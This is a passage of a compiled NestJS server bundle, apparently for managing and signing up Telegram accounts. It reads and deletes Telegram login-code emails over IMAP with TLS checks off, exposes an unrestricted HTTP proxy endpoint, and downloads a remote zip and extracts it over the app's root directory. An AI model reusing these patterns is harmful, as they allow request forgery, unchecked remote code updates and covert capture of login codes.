/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./src/IMap/IMap.ts":
/*!**************************!*\
  !*** ./src/IMap/IMap.ts ***!
  \**************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.MailReader = void 0;
const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
class MailReader {
    constructor() {
        this.isReady = false;
        this.result = '';
        this.imap = new imap_1.default({
            user: process.env.GMAIL_ADD || '',
            password: process.env.GMAIL_PASS || '',
            host: 'imap.gmail.com',
            port: 993,
            tls: true,
            tlsOptions: {
                rejectUnauthorized: false,
            },
        });
        this.imap.on('ready', () => {
            console.log('Mail is Ready');
            this.isReady = true;
        });
        this.imap.on('error', (err) => {
            console.error('SomeError:', err);
            this.isReady = false;
        });
        this.imap.on('end', () => {
            console.log('Connection ended');
            this.isReady = false;
        });
    }
    static getInstance() {
        if (!MailReader.instance) {
            MailReader.instance = new MailReader();
        }
        return MailReader.instance;
    }
    async connectToMail() {
        console.log('Connecting to mail server');
        try {
            this.imap.connect();
            this.isReady = true;
            console.log('Connected to mail server');
        }
        catch (err) {
            console.error('Error connecting to mail server:', (0, parseError_1.parseError)(err));
            throw err;
        }
    }
    async disconnectFromMail() {
        console.log('Disconnecting from mail server');
        try {
            this.imap.end();
            this.isReady = false;
            console.log('Disconnected from mail server');
        }
        catch (err) {
            console.error('Error disconnecting from mail server:', (0, parseError_1.parseError)(err));
            throw err;
        }
    }
    async isMailReady() {
        return this.isReady;
    }
    async getCode() {
        console.log("MailReady : ", this.isReady);
        if (!this.isReady) {
            console.log("Re-Connecting mail server");
            await this.connectToMail();
            await (0, utils_1.sleep)(10000);
        }
        try {
            await this.openInbox();
            const searchCriteria = [['FROM', 'noreply@telegram.org']];
            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };
            console.log('Inbox Opened');
            const results = await new Promise((resolve, reject) => {
                this.imap.search(searchCriteria, (err, results) => {
                    if (err) {
                        console.error('Search error:', (0, parseError_1.parseError)(err));
                        reject(err);
                    }
                    else {
                        resolve(results);
                    }
                });
            });
            if (results.length > 0) {
                console.log('Emails found:', results.length);
                const length = results.length;
                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);
                await new Promise((resolve, reject) => {
                    fetch.on('message', (msg, seqno) => {
                        const emailData = [];
                        msg.on('body', (stream, info) => {
                            let buffer = '';
                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));
                            stream.on('end', () => {
                                if (info.which === 'TEXT') {
                                    emailData.push(buffer);
                                }
                                this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                    if (err)
                                        reject(err);
                                    this.imap.expunge((err) => {
                                        if (err)
                                            reject(err);
                                        console.log('Deleted message');
                                    });
                                });
                            });
                        });
                        msg.once('end', () => {
                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
                            console.log('EmailDataLength:', emailData.length);
                            console.log('Mail:', emailData[emailData.length - 1].split('.'));
                            this.result = (0, utils_1.fetchNumbersFromString)(emailData[emailData.length - 1].split('.')[0]);
                            resolve();
                        });
                    });
                    fetch.once('end', () => {
                        console.log('Fetched mails');
                        resolve();
                    });
                });
            }
            else {
                console.log('No new emails found');
            }
            console.log('Returning result:', this.result);
            return this.result;
        }
        catch (error) {
            console.error('Error:', error);
            this.isReady = false;
            throw error;
        }
    }
    async openInbox() {
        await new Promise((resolve, reject) => {
            this.imap.openBox('INBOX', false, (err) => {
                if (err) {
                    console.error('Open Inbox error:', (0, parseError_1.parseError)(err));
                    reject(err);
                }
                else {
                    console.log('Inbox opened');
                    resolve();
                }
            });
        });
    }
}
exports.MailReader = MailReader;


/***/ }),

/***/ "./src/app.controller.ts":
/*!*******************************!*\
  !*** ./src/app.controller.ts ***!
  \*******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var AppController_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const execute_request_dto_1 = __webpack_require__(/*! ./components/shared/dto/execute-request.dto */ "./src/components/shared/dto/execute-request.dto.ts");
const crypto_1 = __webpack_require__(/*! crypto */ "crypto");
const https = __importStar(__webpack_require__(/*! https */ "https"));
const url_1 = __webpack_require__(/*! url */ "url");
let AppController = AppController_1 = class AppController {
    constructor() {
        this.logger = new common_1.Logger(AppController_1.name);
        this.DEFAULT_TIMEOUT = 30000;
        this.MAX_CONTENT_SIZE = 50 * 1024 * 1024;
    }
    getHello() {
        return 'Hello World!';
    }
    async executeRequest(req, res) {
        const requestId = (0, crypto_1.randomUUID)();
        const startTime = Date.now();
        try {
            const { url, method = 'GET', headers = {}, data, params, responseType = 'json', timeout = this.DEFAULT_TIMEOUT, followRedirects = true, maxRedirects = 5 } = req;
            if (!url) {
                throw new common_1.HttpException('URL is required', common_1.HttpStatus.BAD_REQUEST);
            }
            try {
                const parsedUrl = new url_1.URL(url);
                if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
                    throw new common_1.HttpException('Invalid URL protocol. Only HTTP and HTTPS are supported.', common_1.HttpStatus.BAD_REQUEST);
                }
            }
            catch (error) {
                throw new common_1.HttpException('Invalid URL format', common_1.HttpStatus.BAD_REQUEST);
            }
            const httpsAgent = new https.Agent({
                rejectUnauthorized: true
            });
            this.logger.log({
                message: 'Executing HTTP request',
                requestId,
                details: {
                    url,
                    method,
                    headers: this.sanitizeHeaders(headers),
                    params,
                    responseType,
                    timeout,
                    dataSize: data ? JSON.stringify(data).length : 0
                }
            });
            const response = await (0, axios_1.default)({
                url,
                method,
                headers,
                data,
                params,
                responseType,
                timeout,
                maxRedirects: followRedirects ? maxRedirects : 0,
                maxContentLength: this.MAX_CONTENT_SIZE,
                maxBodyLength: this.MAX_CONTENT_SIZE,
                validateStatus: null,
                decompress: true,
                httpsAgent,
                transitional: {
                    clarifyTimeoutError: true
                }
            });
            const executionTime = Date.now() - startTime;
            this.logger.log({
                message: 'Request completed',
                requestId,
                metrics: {
                    executionTime,
                    status: response.status,
                    contentType: response.headers['content-type'],
                    contentLength: response.headers['content-length']
                }
            });
            Object.entries(response.headers).forEach(([key, value]) => {
                if (key.toLowerCase() === 'transfer-encoding')
                    return;
                if (Array.isArray(value)) {
                    res.setHeader(key, value);
                }
                else if (value) {
                    res.setHeader(key, value.toString());
                }
            });
            res.status(response.status);
            if (this.isBinaryResponse(responseType, response.headers['content-type'])) {
                if (!res.getHeader('content-type') && response.headers['content-type']) {
                    res.setHeader('content-type', response.headers['content-type']);
                }
                res.send(Buffer.from(response.data));
                return;
            }
            res.send(response.data);
            return;
        }
        catch (error) {
            const errorDetails = this.handleRequestError(error, requestId);
            this.logger.error({
                message: 'Request failed',
                requestId,
                error: errorDetails
            });
            res.status(errorDetails.status || common_1.HttpStatus.INTERNAL_SERVER_ERROR);
            res.send(errorDetails);
            return;
        }
    }
    sanitizeHeaders(headers) {
        const sensitiveHeaders = ['authorization', 'cookie', 'proxy-authorization', 'x-api-key'];
        const sanitized = { ...headers };
        sensitiveHeaders.forEach(header => {
            Object.keys(sanitized).forEach(key => {
                if (key.toLowerCase() === header.toLowerCase()) {
                    sanitized[key] = '[REDACTED]';
                }
            });
        });
        return sanitized;
    }
    isBinaryResponse(responseType, contentType) {
        if (responseType === 'arraybuffer')
            return true;
        if (contentType) {
            const binaryTypes = [
                'application/octet-stream',
                'image/',
                'audio/',
                'video/',
                'application/pdf',
                'application/zip',
                'application/x-zip-compressed',
                'application/binary'
            ];
            return binaryTypes.some(type => contentType.toLowerCase().includes(type.toLowerCase()));
        }
        return false;
    }
    handleRequestError(error, requestId) {
        if (axios_1.default.isAxiosError(error)) {
            const axiosError = error;
            if (axiosError.code === 'ECONNABORTED') {
                return {
                    status: common_1.HttpStatus.GATEWAY_TIMEOUT,
                    error: 'Request timeout',
                    message: 'The request took too long to complete',
                    requestId
                };
            }
            if (axiosError.code === 'ECONNREFUSED') {
                return {
                    status: common_1.HttpStatus.BAD_GATEWAY,
                    error: 'Connection refused',
                    message: 'Could not connect to the target server',
                    requestId
                };
            }
            if (axiosError.response) {
                return {
                    status: axiosError.response.status,
                    headers: this.sanitizeHeaders(axiosError.response.headers),
                    data: axiosError.response.data,
                    requestId
                };
            }
            if (axiosError.request) {
                return {
                    status: common_1.HttpStatus.BAD_GATEWAY,
                    error: 'No response',
                    message: 'The request was made but no response was received',
                    code: axiosError.code,
                    requestId
                };
            }
            return {
                status: common_1.HttpStatus.BAD_GATEWAY,
                error: axiosError.code || 'Request failed',
                message: axiosError.message,
                requestId
            };
        }
        return {
            status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
            error: 'Internal server error',
            message: error.message || 'An unexpected error occurred',
            requestId
        };
    }
};
exports.AppController = AppController;
__decorate([
    (0, common_1.Get)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", String)
], AppController.prototype, "getHello", null);
__decorate([
    (0, common_1.Post)('execute-request'),
    (0, swagger_1.ApiOperation)({
        summary: 'Execute an HTTP request with given details',
        description: 'Makes an HTTP request to the specified URL with provided configuration and returns the response'
    }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'Request executed successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid request parameters' }),
    (0, swagger_1.ApiResponse)({ status: 429, description: 'Too many requests' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error or request execution failed' }),
    __param(0, (0, common_1.Body)(new common_1.ValidationPipe({
        transform: true,
        forbidNonWhitelisted: true,
        whitelist: true
    }))),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [execute_request_dto_1.ExecuteRequestDto, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "executeRequest", null);
exports.AppController = AppController = AppController_1 = __decorate([
    (0, swagger_1.ApiTags)('App'),
    (0, common_1.Controller)(),
    __metadata("design:paramtypes", [])
], AppController);


/***/ }),

/***/ "./src/app.module.ts":
/*!***************************!*\
  !*** ./src/app.module.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_module_1 = __webpack_require__(/*! ./components/users/users.module */ "./src/components/users/users.module.ts");
const user_data_module_1 = __webpack_require__(/*! ./components/user-data/user-data.module */ "./src/components/user-data/user-data.module.ts");
const client_module_1 = __webpack_require__(/*! ./components/clients/client.module */ "./src/components/clients/client.module.ts");
const Telegram_module_1 = __webpack_require__(/*! ./components/Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ./components/buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ./components/active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const archived_client_module_1 = __webpack_require__(/*! ./components/archived-clients/archived-client.module */ "./src/components/archived-clients/archived-client.module.ts");
const init_module_1 = __webpack_require__(/*! ./components/ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ./components/channels/channels.module */ "./src/components/channels/channels.module.ts");
const app_controller_1 = __webpack_require__(/*! ./app.controller */ "./src/app.controller.ts");
const logger_middleware_1 = __webpack_require__(/*! ./middlewares/logger.middleware */ "./src/middlewares/logger.middleware.ts");
const build_module_1 = __webpack_require__(/*! ./components/builds/build.module */ "./src/components/builds/build.module.ts");
const upi_ids_module_1 = __webpack_require__(/*! ./components/upi-ids/upi-ids.module */ "./src/components/upi-ids/upi-ids.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ./components/promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
const stat_module_1 = __webpack_require__(/*! ./components/stats/stat.module */ "./src/components/stats/stat.module.ts");
const stat2_module_1 = __webpack_require__(/*! ./components/stats2/stat2.module */ "./src/components/stats2/stat2.module.ts");
const promote_stat_module_1 = __webpack_require__(/*! ./components/promote-stats/promote-stat.module */ "./src/components/promote-stats/promote-stat.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ./components/promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const tg_signup_module_1 = __webpack_require__(/*! ./components/TgSignup/tg-signup.module */ "./src/components/TgSignup/tg-signup.module.ts");
const transaction_module_1 = __webpack_require__(/*! ./components/transactions/transaction.module */ "./src/components/transactions/transaction.module.ts");
const npoint_module_1 = __webpack_require__(/*! ./components/n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const timestamp_module_1 = __webpack_require__(/*! ./components/timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
const memory_cleanup_service_1 = __webpack_require__(/*! ./memory-cleanup.service */ "./src/memory-cleanup.service.ts");
let AppModule = class AppModule {
    configure(consumer) {
        consumer.apply(logger_middleware_1.LoggerMiddleware).forRoutes('*');
    }
};
exports.AppModule = AppModule;
exports.AppModule = AppModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            archived_client_module_1.ArchivedClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            build_module_1.BuildModule,
            upi_ids_module_1.UpiIdModule,
            promote_msgs_module_1.PromoteMsgModule,
            promote_stat_module_1.PromoteStatModule,
            stat_module_1.StatModule,
            stat2_module_1.Stat2Module,
            tg_signup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            npoint_module_1.NpointModule,
            timestamp_module_1.TimestampModule,
        ],
        providers: [memory_cleanup_service_1.MemoryCleanerService],
        controllers: [app_controller_1.AppController],
        exports: [
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            archived_client_module_1.ArchivedClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            tg_signup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            timestamp_module_1.TimestampModule,
        ]
    })
], AppModule);


/***/ }),

/***/ "./src/cloudinary.ts":
/*!***************************!*\
  !*** ./src/cloudinary.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CloudinaryService = void 0;
console.log("in Cloudinary");
const cloudinary = __importStar(__webpack_require__(/*! cloudinary */ "cloudinary"));
const path = __importStar(__webpack_require__(/*! path */ "path"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const adm_zip_1 = __importDefault(__webpack_require__(/*! adm-zip */ "adm-zip"));
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
class CloudinaryService {
    constructor() {
        this.resources = new Map();
        cloudinary.v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }
    static async getInstance(name) {
        if (!CloudinaryService.instance) {
            CloudinaryService.instance = new CloudinaryService();
        }
        await CloudinaryService.instance.getResourcesFromFolder(name);
        return CloudinaryService.instance;
    }
    async downloadAndExtractZip(url) {
        const rootPath = process.cwd();
        const zipPath = path.resolve(rootPath, 'temp.zip');
        const extractPath = path.resolve(rootPath);
        console.log(`Starting download of zip file from ${url}`);
        const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' });
        if (response?.status === 200) {
            console.log('Zip file downloaded successfully.');
            fs.writeFileSync(zipPath, response.data);
            console.log(`Zip file saved to ${zipPath}`);
            const zip = new adm_zip_1.default(zipPath);
            console.log(`Extracting zip file to ${extractPath}`);
            zip.extractAllTo(extractPath, true);
            console.log('Zip file extracted successfully.');
            fs.unlinkSync(zipPath);
            console.log(`Temporary zip file ${zipPath} deleted.`);
        }
        else {
            const errorMessage = `Unable to download zip file from ${url}`;
            console.error(errorMessage);
            throw new Error(errorMessage);
        }
    }
    async getResourcesFromFolder(folderName) {
        console.log('FETCHING NEW FILES!! from CLOUDINARY');
        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);
    }
    async createNewFolder(folderName) {
        await this.createFolder(folderName);
        await this.uploadFilesToFolder(folderName);
    }
    async overwriteFile() {
        const cloudinaryFileId = "index_nbzca5.js";
        const localFilePath = "./src/test.js";
        try {
            const result = await cloudinary.v2.uploader.upload(localFilePath, {
                resource_type: 'auto',
                overwrite: true,
                invalidate: true,
                public_id: cloudinaryFileId
            });
            console.log(result);
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async findAndSaveResources(folderName, type) {
        try {
            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
            await Promise.all(resources.map(async (resource) => {
                try {
                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
                }
                catch (error) {
                    console.log(resource);
                    (0, parseError_1.parseError)(error);
                }
            }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async createFolder(folderName) {
        try {
            const result = await cloudinary.v2.api.create_folder(folderName);
            return result;
        }
        catch (error) {
            console.error('Error creating folder:', error);
            throw error;
        }
    }
    async uploadFilesToFolder(folderName) {
        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
            try {
                const result = await cloudinary.v2.uploader.upload_large(url, {
                    folder: folderName,
                    resource_type: 'auto',
                    public_id: key,
                });
                return result;
            }
            catch (error) {
                console.error('Error uploading file:', error);
                throw error;
            }
        });
        try {
            return await Promise.all(uploadPromises);
        }
        catch (error) {
            console.error('Error uploading files:', error);
            throw error;
        }
    }
    async printResources() {
        try {
            this.resources?.forEach((val, key) => {
                console.log(key, ":", val);
            });
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    get(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            console.log(error);
        }
    }
}
exports.CloudinaryService = CloudinaryService;
async function saveFile(url, name) {
    try {
        const extension = url.substring(url.lastIndexOf('.') + 1);
        const rootPath = process.cwd();
        const mypath = path.join(rootPath, `${name}.${extension}`);
        console.log(mypath);
        const res = await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' }, 2);
        if (res?.statusText === 'OK') {
            if (!fs.existsSync(mypath)) {
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Saved!!`);
            }
            else {
                fs.unlinkSync(mypath);
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Replaced!!`);
            }
        }
        else {
            throw new Error(`Unable to download file from ${url}`);
        }
    }
    catch (err) {
        (0, parseError_1.parseError)(err);
    }
}


/***/ }),

/***/ "./src/components/ConfigurationInit/configuration.schema.ts":
/*!******************************************************************!*\
  !*** ./src/components/ConfigurationInit/configuration.schema.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationSchema = exports.Configuration = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Configuration = class Configuration {
};
exports.Configuration = Configuration;
exports.Configuration = Configuration = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Configuration);
exports.ConfigurationSchema = mongoose_1.SchemaFactory.createForClass(Configuration);
exports.ConfigurationSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/ConfigurationInit/index.ts":
/*!***************************************************!*\
  !*** ./src/components/ConfigurationInit/index.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.module */ "./src/components/ConfigurationInit/init.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts"), exports);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.controller.ts":
/*!*************************************************************!*\
  !*** ./src/components/ConfigurationInit/init.controller.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
let ConfigurationController = class ConfigurationController {
    constructor(configurationService) {
        this.configurationService = configurationService;
    }
    async findOne() {
        return this.configurationService.findOne();
    }
    async update(updateClientDto) {
        return this.configurationService.update(updateClientDto);
    }
};
exports.ConfigurationController = ConfigurationController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get configuration data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update configuration' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "update", null);
exports.ConfigurationController = ConfigurationController = __decorate([
    (0, swagger_1.ApiTags)('Configuration'),
    (0, common_1.Controller)('configuration'),
    __metadata("design:paramtypes", [init_service_1.ConfigurationService])
], ConfigurationController);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.module.ts":
/*!*********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.module.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
